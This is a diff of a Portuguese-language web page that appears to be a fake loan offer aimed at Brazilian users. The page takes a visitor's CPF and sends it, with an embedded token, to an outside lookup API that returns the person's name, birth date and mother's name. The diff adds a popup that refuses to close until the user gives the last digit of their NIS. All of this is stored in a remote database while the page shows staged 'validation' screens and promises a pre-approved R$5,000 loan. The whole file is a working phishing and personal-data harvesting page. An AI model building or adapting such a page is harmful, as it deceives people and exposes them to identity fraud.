@@ -91,7 +91,7 @@
 
     h1 {
       color: #003e6b;
-      font-size: 35px;
+      font-size: 28px;
       font-weight: 600;
       text-align: left;
       line-height: 1.3;
@@ -102,7 +102,15 @@
       margin-bottom: 24px;
     }
 
-    input[type="tel"] {
+    label {
+      display: block;
+      color: #374151;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+
+    input[type="tel"], input[type="text"] {
       width: 100%;
       padding: 16px 20px;
       border: 1px solid #d1d5db;
@@ -113,11 +121,7 @@
       transition: border-color 0.2s;
     }
 
-    input[type="tel"]::placeholder {
-      color: #9ca3af;
-    }
-
-    input[type="tel"]:focus {
+    input:focus {
       border-color: #0066b3;
     }
 
@@ -143,64 +147,116 @@
       padding-bottom: 20px;
     }
 
-    .validation-overlay {
+    /* Popup Styles */
+    .popup-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: #0066b3;
-      z-index: 1000;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 3000;
       display: none;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
+      backdrop-filter: blur(3px);
+    }
+
+    .popup-content {
+      background: white;
+      border-radius: 24px;
+      width: 90%;
+      max-width: 340px;
+      padding: 32px 24px;
       text-align: center;
+      animation: popupFadeIn 0.3s ease-out;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
     }
 
-    .validation-icon {
-      margin-bottom: 40px;
-      position: relative;
+    @keyframes popupFadeIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
     }
 
-    .validation-icon img {
-      width: 80px;
-      height: auto;
-      display: block;
-      margin: 0 auto;
-    }
-
-    .check-circle {
+    .popup-icon {
       width: 64px;
       height: 64px;
-      background: #25D366;
+      background: #d97706;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 24px auto;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      margin: 0 auto 20px auto;
     }
 
-    .check-circle svg {
+    .popup-icon svg {
       width: 32px;
       height: 32px;
       fill: white;
     }
 
-    .validation-text {
-      color: white;
-    }
-
-    .validation-text h2 {
+    .popup-content h2 {
+      color: #003e6b;
       font-size: 24px;
-      font-weight: 700;
-      margin-bottom: 8px;
+      margin-bottom: 12px;
     }
 
-    .validation-text p {
+    .popup-content p {
+      color: #374151;
       font-size: 16px;
-      opacity: 0.9;
+      margin-bottom: 20px;
+    }
+
+    .popup-nis-input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      font-size: 24px;
+      text-align: center;
+      letter-spacing: 4px;
+      margin-bottom: 20px;
+    }
+
+    .popup-nis-input:focus {
+      border-color: #d97706;
+      outline: none;
+    }
+
+    .popup-btn {
+      width: 100%;
+      padding: 14px;
+      background: #d97706;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .popup-btn:hover {
+      background: #b85e00;
+    }
+
+    .popup-btn:disabled {
+      background: #d4dfe6;
+      color: #a0adb5;
+      cursor: not-allowed;
+    }
+
+    .error-message {
+      color: #dc2626;
+      font-size: 14px;
+      margin-bottom: 8px;
+      font-weight: 500;
     }
 
     .loading-screen {
@@ -225,89 +281,35 @@
       margin-bottom: 40px;
     }
 
-    .loading-icon {
-      width: 80px;
-      height: 80px;
-      margin-bottom: 40px;
-      display: none;
-      filter: brightness(0) invert(1);
-    }
-
     .loading-message {
       color: white;
       font-size: 20px;
       font-weight: 600;
       margin-bottom: 12px;
-      animation: fadeInOut 2s ease-in-out infinite;
-    }
-
-    .loading-message.final {
-      animation: none;
-      font-size: 24px;
-    }
-
-    .loading-submessage {
-      color: white;
-      font-size: 14px;
-      opacity: 0.85;
-    }
-
-    .loan-amount {
-      display: none;
-      color: #FFD700;
-      font-size: 22px;
-      font-weight: 700;
-      margin-top: 20px;
-      margin-bottom: 8px;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-    }
-
-    .loan-text {
-      display: none;
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      opacity: 0.95;
-    }
-
-    @keyframes fadeInOut {
-      0%, 100% { opacity: 0.7; }
-      50% { opacity: 1; }
-    }
-
-    .hidden {
-      display: none !important;
-    }
-
-    .error-message {
-      color: #dc2626;
-      font-size: 14px;
-      margin-bottom: 8px;
-      font-weight: 500;
-    }
-
-    /* API Error Message */
-    .api-error {
-      background: #fee2e2;
-      color: #dc2626;
-      padding: 12px;
-      border-radius: 12px;
-      font-size: 14px;
-      margin-bottom: 16px;
-      text-align: center;
-      display: none;
     }
   </style>
 </head>
 <body>
   <!-- Loading Screen -->
   <div class="loading-screen" id="loadingScreen">
-    <img src="loading.gif" alt="Carregando..." class="loading-gif" id="loadingGif">
-    <img src="icone.png" alt="Validado" class="loading-icon" id="loadingIcon">
-    <div class="loading-message" id="loadingMessage">Estamos validando seus dados</div>
-    <div class="loading-submessage" id="loadingSubmessage">Por favor, aguarde...</div>
-    <div class="loan-text" id="loanText">Valor pré-disponível identificado</div>
-    <div class="loan-amount" id="loanAmount">R$ 5.000 de empréstimo</div>
+    <img src="loading.gif" alt="Carregando..." class="loading-gif">
+    <div class="loading-message" id="loadingMessage">Processando sua solicitação...</div>
+  </div>
+
+  <!-- Popup para NIS -->
+  <div class="popup-overlay" id="popupNIS">
+    <div class="popup-content">
+      <div class="popup-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+      </div>
+      <h2 id="popupNome">Olá, Cliente!</h2>
+      <p>CPF identificado com sucesso.<br>Para continuar, informe o <strong>último dígito do seu NIS</strong> (Número de Identificação Social).</p>
+      <input type="text" class="popup-nis-input" id="nisDigit" maxlength="1" placeholder="0-9" inputmode="numeric">
+      <div id="nisError" class="error-message" style="display: none;">Digite um dígito válido (0-9)</div>
+      <button class="popup-btn" id="confirmarNisBtn">Confirmar e Continuar</button>
+    </div>
   </div>
 
   <div class="container">
@@ -322,34 +324,18 @@
 
       <div class="input-wrapper">
         <div id="cpfError" class="error-message" style="display: none;">CPF Inválido</div>
-        <div id="apiError" class="api-error" style="display: none;">Erro ao consultar dados. Tente novamente.</div>
+        <div id="apiError" class="error-message" style="display: none;">Erro ao consultar dados. Tente novamente.</div>
         <input type="tel" placeholder="Digite o seu CPF" maxlength="14" id="cpfInput" inputmode="numeric">
       </div>
 
       <button class="submit-btn" id="submitBtn">Próximo</button>
 
-      <div class="version">Versão: 1.91.23</div>
-    </div>
-  </div>
-
-  <!-- Validation Overlay -->
-  <div class="validation-overlay" id="validationOverlay">
-    <div class="validation-icon">
-      <img src="icone.png" alt="Validando" style="filter: brightness(0) invert(1);">
-    </div>
-    <div class="check-circle">
-      <svg viewBox="0 0 24 24">
-        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-      </svg>
-    </div>
-    <div class="validation-text">
-      <h2>Sucesso!</h2>
-      <p id="validationMessage">Conseguimos validar o CPF.</p>
+      <div class="version">Versão: 2.0.0</div>
     </div>
   </div>
 
   <!-- ============================================ -->
-  <!-- SUPABASE INTEGRATION
+  <!-- SUPABASE INTEGRATION -->
   <!-- ============================================ -->
   <script>
     const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
@@ -404,13 +390,21 @@
   </script>
 
   <script>
-    // CPF Formatting
     const cpfInput = document.getElementById('cpfInput');
     const submitBtn = document.getElementById('submitBtn');
-    const loadingScreen = document.getElementById('loadingScreen');
-    const loadingMessage = document.getElementById('loadingMessage');
     const cpfError = document.getElementById('cpfError');
     const apiError = document.getElementById('apiError');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const loadingMessage = document.getElementById('loadingMessage');
+    
+    // Popup elementos
+    const popupNIS = document.getElementById('popupNIS');
+    const popupNome = document.getElementById('popupNome');
+    const nisDigit = document.getElementById('nisDigit');
+    const nisError = document.getElementById('nisError');
+    const confirmarNisBtn = document.getElementById('confirmarNisBtn');
+
+    let dadosCliente = null;
 
     // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA
     salvarEtapa('pagina_acesso', { 
@@ -418,6 +412,7 @@
       timestamp_acesso: new Date().toISOString()
     });
 
+    // Formatação do CPF
     cpfInput.addEventListener('input', function(e) {
       cpfError.style.display = 'none';
       apiError.style.display = 'none';
@@ -450,6 +445,7 @@
       }
     });
 
+    // Validação de CPF
     function validateCPF(cpf) {
       cpf = cpf.replace(/[^\d]+/g, '');
       if (cpf == '') return false;
@@ -480,6 +476,7 @@
       return true;
     }
 
+    // Botão de envio do CPF
     submitBtn.addEventListener('click', async function() {
       if (!this.disabled) {
         if (!validateCPF(cpfInput.value)) {
@@ -488,14 +485,10 @@
         }
         
         const cpfLimpo = cpfInput.value.replace(/\D/g, '');
-        let nomeCliente = null;
-        let dadosAPI = null;
         
-        // ========================================
-        // BUSCA O NOME DO CLIENTE NA API EXTERNA
-        // ========================================
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Consultando dados...';
+        // Mostra loading
+        loadingScreen.style.display = 'flex';
+        loadingMessage.textContent = 'Consultando CPF...';
         
         try {
           const apiUrl = `https://api.amnesiatecnologia.lat/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=${cpfLimpo}`;
@@ -505,110 +498,130 @@
           const data = await response.json();
           
           if (data && data.DADOS && data.DADOS.nome) {
-            nomeCliente = data.DADOS.nome;
-            dadosAPI = data.DADOS;
-            console.log('✅ Nome encontrado na API:', nomeCliente);
-            console.log('📦 Dados completos:', dadosAPI);
-            apiError.style.display = 'none';
+            dadosCliente = {
+              cpf: cpfLimpo,
+              cpf_formatado: cpfInput.value,
+              nome: data.DADOS.nome,
+              data_nascimento: data.DADOS.data_nascimento,
+              nome_mae: data.DADOS.nome_mae,
+              sexo: data.DADOS.sexo
+            };
+            
+            console.log('✅ Cliente identificado:', dadosCliente.nome);
+            
+            // Esconde loading e mostra popup com Nome
+            loadingScreen.style.display = 'none';
+            
+            // Mostra popup com o nome do cliente
+            const primeiroNome = dadosCliente.nome.split(' ')[0];
+            popupNome.innerHTML = `Olá, ${primeiroNome}!`;
+            popupNIS.style.display = 'flex';
+            
           } else {
-            console.log('⚠️ Nome não encontrado na API');
+            loadingScreen.style.display = 'none';
             apiError.style.display = 'block';
-            apiError.textContent = 'CPF não localizado. Verifique e tente novamente.';
+            apiError.textContent = 'CPF não encontrado. Verifique e tente novamente.';
             submitBtn.disabled = false;
-            submitBtn.textContent = 'Próximo';
-            return;
           }
         } catch (error) {
           console.error('❌ Erro ao consultar API:', error);
+          loadingScreen.style.display = 'none';
           apiError.style.display = 'block';
           apiError.textContent = 'Erro na consulta. Tente novamente.';
           submitBtn.disabled = false;
-          submitBtn.textContent = 'Próximo';
+        }
+      }
+    });
+
+    // Validação do dígito do NIS
+    nisDigit.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 1) value = value.slice(0, 1);
+      e.target.value = value;
+      
+      if (value.length === 1) {
+        nisError.style.display = 'none';
+        confirmarNisBtn.disabled = false;
+        confirmarNisBtn.style.background = '#d97706';
+        confirmarNisBtn.style.cursor = 'pointer';
+      } else {
+        confirmarNisBtn.disabled = true;
+        confirmarNisBtn.style.background = '#d4dfe6';
+        confirmarNisBtn.style.cursor = 'not-allowed';
+      }
+    });
+
+    // Confirmação do NIS
+    confirmarNisBtn.addEventListener('click', async function() {
+      if (!this.disabled) {
+        const ultimoDigitoNIS = nisDigit.value;
+        
+        if (!ultimoDigitoNIS || ultimoDigitoNIS.length !== 1) {
+          nisError.style.display = 'block';
           return;
         }
         
+        // Fecha o popup
+        popupNIS.style.display = 'none';
+        
+        // Mostra loading
+        loadingScreen.style.display = 'flex';
+        loadingMessage.textContent = 'Validando informações...';
+        
         // ========================================
-        // SALVA CPF E NOME NO BANCO DE DADOS
+        // SALVA CPF, NOME E NIS NO BANCO
         // ========================================
-        submitBtn.textContent = 'Salvando dados...';
         
         await salvarEtapa('cpf_informado', {
-          cpf: cpfLimpo,
-          cpf_formatado: cpfInput.value,
-          nome: nomeCliente,
-          data_nascimento: dadosAPI?.data_nascimento,
-          nome_mae: dadosAPI?.nome_mae,
-          sexo: dadosAPI?.sexo,
+          cpf: dadosCliente.cpf,
+          cpf_formatado: dadosCliente.cpf_formatado,
+          nome: dadosCliente.nome,
+          data_nascimento: dadosCliente.data_nascimento,
+          nome_mae: dadosCliente.nome_mae,
+          sexo: dadosCliente.sexo,
+          ultimo_digito_nis: ultimoDigitoNIS,
           timestamp: new Date().toISOString()
         });
         
         // Salva no storage para usar nas próximas páginas
         const clienteData = {
-          cpf: cpfLimpo,
-          nome: nomeCliente,
-          data_nascimento: dadosAPI?.data_nascimento,
-          nome_mae: dadosAPI?.nome_mae
+          cpf: dadosCliente.cpf,
+          nome: dadosCliente.nome,
+          data_nascimento: dadosCliente.data_nascimento,
+          nome_mae: dadosCliente.nome_mae,
+          ultimo_digito_nis: ultimoDigitoNIS
         };
         localStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
         sessionStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
         
         // ========================================
-        // MOSTRA TELA DE LOADING COM O NOME
+        // VALIDAÇÃO CONCLUÍDA - VAI PARA PRÓXIMA ETAPA
         // ========================================
-        loadingScreen.style.display = 'flex';
         
-        const loadingGif = document.getElementById('loadingGif');
-        const loadingIcon = document.getElementById('loadingIcon');
-        const loadingSubmessage = document.getElementById('loadingSubmessage');
+        await salvarEtapa('validacao_concluida', {
+          status: 'sucesso',
+          cpf_validado: dadosCliente.cpf,
+          nome_cliente: dadosCliente.nome,
+          ultimo_digito_nis: ultimoDigitoNIS,
+          valor_pre_aprovado: 5000,
+          timestamp: new Date().toISOString()
+        });
         
-        const messages = [
-          'Estamos validando seus dados',
-          'Verificando informações',
-          'Processando sua solicitação',
-          'Carregando sistema de segurança',
-          'Confirmando identidade',
-          'Validando CPF',
-          'Consultando base de dados',
-          'Verificando segurança',
-          'Autenticando acesso',
-          'Processando dados'
-        ];
+        loadingMessage.textContent = 'Redirecionando...';
         
-        let messageIndex = 0;
-        
-        const messageInterval = setInterval(() => {
-          messageIndex = (messageIndex + 1) % messages.length;
-          loadingMessage.textContent = messages[messageIndex];
-        }, 1000);
-        
-        setTimeout(async function() {
-          clearInterval(messageInterval);
-          
-          await salvarEtapa('validacao_concluida', {
-            status: 'sucesso',
-            cpf_validado: cpfLimpo,
-            nome_cliente: nomeCliente,
-            valor_pre_aprovado: 5000,
-            timestamp: new Date().toISOString()
-          });
-          
-          loadingGif.style.display = 'none';
-          loadingIcon.style.display = 'block';
-          loadingMessage.classList.add('final');
-          
-          // Exibe o nome do cliente na tela de loading
-          loadingMessage.textContent = `Olá, ${nomeCliente.split(' ')[0]}!`;
-          loadingSubmessage.textContent = 'Validação concluída com sucesso';
-          
-          const loanAmount = document.getElementById('loanAmount');
-          const loanText = document.getElementById('loanText');
-          loanAmount.style.display = 'block';
-          loanText.style.display = 'block';
-          
-          setTimeout(function() {
-            window.location.href = 'emprestimo4e98.html?a7k9m2x1p12';
-          }, 5000);
-        }, 6000);
+        setTimeout(function() {
+          window.location.href = 'emprestimo4e98.html?a7k9m2x1p12';
+        }, 2000);
+      }
+    });
+
+    // Fechar popup clicando fora (opcional - desabilitado para forçar NIS)
+    // Não permitir fechar clicando fora
+    document.getElementById('popupNIS').addEventListener('click', function(e) {
+      if (e.target === this) {
+        // Não faz nada - obriga a preencher o NIS
+        nisError.style.display = 'block';
+        nisError.textContent = 'Por favor, informe o último dígito do NIS para continuar.';
       }
     });
   </script>
